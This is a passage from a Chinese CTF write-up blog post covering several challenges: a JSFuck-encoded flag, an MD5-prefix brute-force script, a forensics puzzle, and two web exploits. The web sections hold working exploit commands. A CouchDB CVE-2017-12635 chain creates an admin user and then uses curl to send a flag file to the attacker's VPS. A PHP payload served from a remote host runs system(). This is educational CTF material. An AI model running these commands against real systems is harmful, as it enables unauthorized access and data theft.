class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(+![<span class="string"></span>]+[<span class="string">![</span>]]+([<span class="string"></span>]+[<span class="string"></span>])[<span class="string">([</span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+[<span class="string">+[</span>]]]](!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+[<span class="string">+!+[</span>]])[<span class="string">+!+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]])()(([<span class="string"></span>]+[<span class="string"></span>])[<span class="string">([![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+([<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]]()[<span class="string">+[</span>]])[<span class="string">+[</span>]]+[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]])+([<span class="string"></span>]+[<span class="string"></span>])[<span class="string">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]()[<span class="string">+!+[</span>]+[<span class="string">!+[</span>]+!+[<span class="string"></span>]]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()</div><div class="line"></div><div class="line"></div><div class="line">flag&#123;a0448fd730b62c13ca80200c4529daa2&#125;</div></pre></td></tr></table></figure></p>
+<p>看起来像是brainfuck、jsfuck之类的，直接试试浏览器console执行，恰好alert弹出flag。</p>
+<p>大概</p>
+<h2 id="crypto-2"><a href="#crypto-2" class="headerlink" title="crypto 2"></a>crypto 2</h2><p>已知md5前缀<br>密码为4位数字字母组合</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">def enum_md5():</div><div class="line">    prefix = <span class="string">'c2979c7124'</span></div><div class="line">    text1 = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></div><div class="line">    text2 = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></div><div class="line">    text3 = <span class="string">'0123456789'</span></div><div class="line">    <span class="keyword">text</span> = text1 + text2 + text3</div><div class="line"></div><div class="line">    password_list = []</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="built_in">len</span>(<span class="keyword">text</span>)):</div><div class="line">        password = [<span class="string">'a'</span>, <span class="string">'a'</span>, <span class="string">'a'</span>, <span class="string">'a'</span>]</div><div class="line">        password[<span class="number">0</span>] = <span class="keyword">text</span>[i]</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="built_in">len</span>(<span class="keyword">text</span>)):</div><div class="line">            password[<span class="number">1</span>] = <span class="keyword">text</span>[j]</div><div class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>, <span class="built_in">len</span>(<span class="keyword">text</span>)):</div><div class="line">                password[<span class="number">2</span>] = <span class="keyword">text</span>[k]</div><div class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">0</span>, <span class="built_in">len</span>(<span class="keyword">text</span>)):</div><div class="line">                    password[<span class="number">3</span>] = <span class="keyword">text</span>[l]</div><div class="line">                    <span class="comment"># print password</span></div><div class="line">                    <span class="comment"># print ''.join(password)</span></div><div class="line">                    <span class="comment"># time.sleep(1)</span></div><div class="line">                    password_list.append(<span class="string">''</span>.join(password))</div><div class="line"></div><div class="line">    <span class="keyword">for</span> password <span class="keyword">in</span> password_list:</div><div class="line">        hash_maker = hashlib.md5()</div><div class="line">        hash_maker.update(password)</div><div class="line">        md5_fingerprint = hash_maker.hexdigest()</div><div class="line">        <span class="comment"># print prefix</span></div><div class="line">        <span class="comment"># print md5_fingerprint[:10]</span></div><div class="line">        <span class="keyword">if</span> md5_fingerprint[:<span class="number">10</span>] == prefix:</div><div class="line">            print password</div><div class="line"></div><div class="line">def main():</div><div class="line">    enum_md5()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
+<h2 id="“粽子的来历-”解题思路"><a href="#“粽子的来历-”解题思路" class="headerlink" title="“粽子的来历 ”解题思路"></a>“粽子的来历 ”解题思路</h2><p>详解请查看印象笔记</p>
+<p>WinHex 打开<br>替换内容为FFFFFFFFF…<br>WinHex - 右键选中 - Edit - Fill Block<br>以 doc 格式打开</p>
+<p>结合题目说FLAG是某二进制状态的MD5哈希值。可以猜到这些段落宽度和二进制有关。得出了二进制，并该二进 制内容进行md5哈希，获得flag。</p>
+<h2 id="与时俱进"><a href="#与时俱进" class="headerlink" title="与时俱进"></a>与时俱进</h2><p>拿到题目后发现80端口无法访问，于是扫了一波端口<br>发现5984开放<br>搜了一下，发现是CouchDB漏洞<br>然后发现2017的CVE：CVE-2017-12635<br>可以创建一个管理员用户</p>
+<figure class="highlight scilab"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -X PUT <span class="string">'http://192.168.5.39:5984/_users/org.couchdb.user:xu1'</span> --data-binary <span class="string">'&#123;"</span><span class="built_in">type</span><span class="string">": "</span>user<span class="string">","</span>name<span class="string">": "</span>sky<span class="string">","</span>roles<span class="string">": ["</span>_admin<span class="string">"],"</span>roles<span class="string">": [],"</span>password<span class="string">": "</span>sky<span class="string">"&#125;'</span></div></pre></td></tr></table></figure>
+<p>然后我们就可以用管理员用户登录了，后面就是未授权漏洞的打法了：<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">curl -X PUT <span class="symbol">'http</span>://sky:sky@<span class="number">192.168</span>.<span class="number">5.39</span>:<span class="number">5984</span>/_config/query_servers/cmd' -d '<span class="string">"/usr/bin/curl http://你的vps/`cat /home/flag.txt`"</span>'</div><div class="line">curl -X PUT <span class="symbol">'http</span>://sky:sky@<span class="number">192.168</span>.<span class="number">5.39</span>:<span class="number">5984</span>/skytest</div><div class="line">curl -X PUT <span class="symbol">'http</span>://sky:sky@<span class="number">192.168</span>.<span class="number">5.39</span>:<span class="number">5984</span>/skytest/vul' -d '&#123;<span class="string">"_id"</span>:<span class="string">"770895a97726d5ca6d70a22173005c7b"</span>&#125;</div><div class="line">curl -X POST <span class="symbol">'http</span>://sky:sky@<span class="number">192.168</span>.<span class="number">5.39</span>:<span class="number">5984</span>/skytest/_temp_view?limit=<span class="number">11</span>' -d '&#123;<span class="string">"language"</span>:<span class="string">"cmd"</span>,<span class="string">"map"</span>:<span class="string">""</span>&#125;' -H <span class="symbol">'Content</span>-<span class="keyword">Type</span>: application/json'</div></pre></td></tr></table></figure></p>
+<h2 id="爱窒息、痛"><a href="#爱窒息、痛" class="headerlink" title="爱窒息、痛"></a>爱窒息、痛</h2><p>拿到题目后分析了一下源码:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="php">$a = <span class="keyword">isset</span>($_POST[<span class="string">'pass'</span>]) ? trim($_POST[<span class="string">'pass'</span>]) : <span class="string">''</span>;</span></div><div class="line"><span class="php"><span class="keyword">if</span> ($a == <span class="string">''</span>) &#123;</span></div><div class="line"><span class="php">    echologin();</span></div><div class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></div><div class="line"><span class="php">    chkpass($a);</span></div><div class="line"><span class="php">    helloowner($a);</span></div><div class="line"><span class="php">&#125;</span></div><div class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">chkpass</span><span class="params">($a)</span> </span>&#123;</span></div><div class="line"><span class="php">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>], md5($a)) === <span class="keyword">false</span>) &#123;</span></div><div class="line"><span class="php">        echofail(<span class="number">1</span>);	</span></div><div class="line"><span class="php">    &#125;</span></div><div class="line"><span class="php">    <span class="keyword">return</span> <span class="keyword">true</span>;</span></div><div class="line"><span class="php">&#125;</span></div><div class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">helloowner</span><span class="params">($a)</span> </span>&#123;</span></div><div class="line"><span class="php">    $b = gencodeurl($a);</span></div><div class="line"><span class="php">    $c = file_get_contents($b);</span></div><div class="line"><span class="php">    <span class="keyword">if</span> ($c == <span class="keyword">false</span>) &#123;</span></div><div class="line"><span class="php">        echofail(<span class="number">2</span>);</span></div><div class="line"><span class="php">    &#125;</span></div><div class="line"><span class="php">    $d = @json_decode($c, <span class="number">1</span>);</span></div><div class="line"><span class="php">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($d[<span class="string">'f'</span>])) &#123;</span></div><div class="line"><span class="php">        echofail(<span class="number">3</span>);</span></div><div class="line"><span class="php">    &#125;</span></div><div class="line"><span class="php">    $d[<span class="string">'f'</span>]($d[<span class="string">'d'</span>]);</span></div><div class="line"><span class="php">&#125;</span></div><div class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">gencodeurl</span><span class="params">($a)</span> </span>&#123;</span></div><div class="line"><span class="php">    $e = md5(date(<span class="string">"Y-m-d"</span>));</span></div><div class="line"><span class="php">    <span class="keyword">if</span> (strlen($a) &gt; <span class="number">40</span>) &#123;</span></div><div class="line"><span class="php">        $f = substr($a, <span class="number">30</span>, <span class="number">5</span>);</span></div><div class="line"><span class="php">        $g = substr($a, <span class="number">10</span>, <span class="number">10</span>);</span></div><div class="line"><span class="php">    &#125; <span class="keyword">else</span> &#123;</span></div><div class="line"><span class="php">        $f = <span class="string">'good'</span>;</span></div><div class="line"><span class="php">        $g = <span class="string">'web.com'</span>;</span></div><div class="line"><span class="php">    &#125;</span></div><div class="line"><span class="php">    $b = <span class="string">'http://'</span> . $f . $g;</span></div><div class="line"><span class="php">    <span class="keyword">return</span> $b;</span></div><div class="line"><span class="php">&#125;</span></div><div class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">echofail</span><span class="params">($h)</span> </span>&#123;</span></div><div class="line"><span class="php">    $i = <span class="string">'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAzMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PHAgZXJyaWQ9IiVpZCUiPuKFoS3jgIDjgIDilbAg5b+r55yL44CB5pyJ54Gw5py644CB5Zyo5rK15aS05LiK54Gw5p2l54Gw5Y6755qE44CCPC9wPjxwIHN0eWxlPSJmb250LXNpemU6IDUwJTsiPjxhIGhyZWY9Imh0dHBzOi8vd3d3LmxvdmVzdG9wcGFpbi50a0BibG9nLnZ1bHNweS5jb20vIj7niLHjgYTnqpLmga/jgIHnl5s8L2E+IOS4k+eUqOWQjumXqDwvcD48L2JvZHk+PC9odG1sPg=='</span>;</span></div><div class="line"><span class="php">    <span class="keyword">echo</span> str_replace(<span class="string">'%id%'</span>, $h, base64_decode($i));</span></div><div class="line"><span class="php">    <span class="keyword">exit</span>;</span></div><div class="line"><span class="php">&#125;</span></div><div class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">echologin</span><span class="params">()</span> </span>&#123;</span></div><div class="line"><span class="php">    $j = <span class="string">'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAyMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PGZvcm0gYWNpdG9uPSIiIG1ldGhvZD0iUE9TVCI+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzIiBwbGFjZWhvbGRlcj0icGFzcyI+PGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0ic3VibWl0Ij48L2Zvcm0+PHAgc3R5bGU9ImZvbnQtc2l6ZTogNTAlOyI+PGEgaHJlZj0iaHR0cHM6Ly93d3cubG92ZXN0b3BwYWluLnRrQGJsb2cudnVsc3B5LmNvbS8iPueIseOBhOeqkuaBr+OAgeeXmzwvYT4g5LiT55So5ZCO6ZeoPC9wPjwvYm9keT48L2h0bWw+'</span>;</span></div><div class="line"><span class="php">    <span class="keyword">echo</span> base64_decode($j);</span></div><div class="line"><span class="php">    <span class="keyword">exit</span>;</span></div><div class="line"><span class="php">&#125; <span class="meta">?&gt;</span></span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>主流程在于:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">gencodeurl</span><span class="params">($a)</span> </span>&#123;</div><div class="line">    $e = md5(date(<span class="string">"Y-m-d"</span>));</div><div class="line">    <span class="keyword">if</span> (strlen($a) &gt; <span class="number">40</span>) &#123;</div><div class="line">        $f = substr($a, <span class="number">30</span>, <span class="number">5</span>);</div><div class="line">        $g = substr($a, <span class="number">10</span>, <span class="number">10</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $f = <span class="string">'good'</span>;</div><div class="line">        $g = <span class="string">'web.com'</span>;</div><div class="line">    &#125;</div><div class="line">    $b = <span class="string">'http://'</span> . $f . $g;</div><div class="line">    <span class="keyword">return</span> $b;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>流程如下：<br>1.首先会chkpass()一下HTTP_USER_AGENT有没有变量a的md5值<br>2.然后将变量a中的substr($a, 30, 5)给变量f，substr($a, 10, 10)给变量g<br>3.然后将其进行拼接：’http://‘ . $f . $g<br>4.再返回给变量b<br>5.然后file_get_contents($b)读取b的文件，赋给变量c<br>6.然后将变量c进行json_decode<br>7.最后有一个利用$d<a href="$d[&#39;d&#39;]">‘f’</a></p>
+<p>所以我们的攻击点就很清楚了，首先在我们的vps上放一个文件，里面精心构造好一个json_encode<br>这里我们选择system(‘cat ../flag.php’)<br>可以构造：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span> </span></div><div class="line"><span class="php">$d[<span class="string">'f'</span>] = <span class="string">'system'</span>;</span></div><div class="line"><span class="php">$d[<span class="string">'g'</span>] = <span class="string">'cat ../flag.php'</span>;</span></div><div class="line"><span class="php"><span class="keyword">echo</span> json_encode($d);</span></div><div class="line"><span class="php"> <span class="meta">?&gt;</span></span></div></pre></td></tr></table></figure></p>
+<p>输出为<br><figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;<span class="attr">"f"</span>:<span class="string">"system"</span>,<span class="attr">"g"</span>:<span class="string">"cat ..\/flag.php"</span>&#125;</div></pre></td></tr></table></figure></p>
+<p>然后这里传入的变量b只有15个字符可控，然后我计算了一下:<br><figure class="highlight coq"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">skysec.<span class="built_in">top</span>/<span class="number">11.</span>c</div></pre></td></tr></table></figure></p>
+<p>刚刚好15个字符<br>于是将我们之前构造的文件命名为11.c放在域名为skysec.top的vps上<br>然后构造<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$a = <span class="string">"asdfghjklzc.top/11.ctyuioqwertskysecwertyuioqwertyuiop"</span></div><div class="line"><span class="number">66</span>cb<span class="number">1</span><span class="keyword">c</span><span class="number">378941</span><span class="keyword">c</span><span class="number">2</span><span class="keyword">cc</span><span class="number">0</span>f<span class="number">1</span>d<span class="number">7979</span>ca<span class="number">595461</span></div></pre></td></tr></table></figure></p>
+<p>注：<br>后来听说题目变成了<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">function gencodeurl($a)</div><div class="line">&#123;</div><div class="line">    $e = md5(date(<span class="string">"Y-m-d"</span>));</div><div class="line">    <span class="keyword">if</span> (strlen($a) &gt; <span class="number">40</span>) &#123;</div><div class="line">        $f = <span class="keyword">substr</span>($a, <span class="number">30</span>, <span class="number">5</span>);</div><div class="line">        $g = <span class="keyword">substr</span>($a, <span class="number">10</span>, <span class="number">10</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $f = <span class="string">'vs'</span>;</div><div class="line">        $g = <span class="string">'vs.vulspy.com'</span>;</div><div class="line">    &#125;</div><div class="line">    $b = <span class="string">'http://'</span> . $f . <span class="keyword">substr</span>($e, <span class="number">3</span>, <span class="number">10</span>) . $g;</div><div class="line">    <span class="keyword">return</span> $b;</div><div 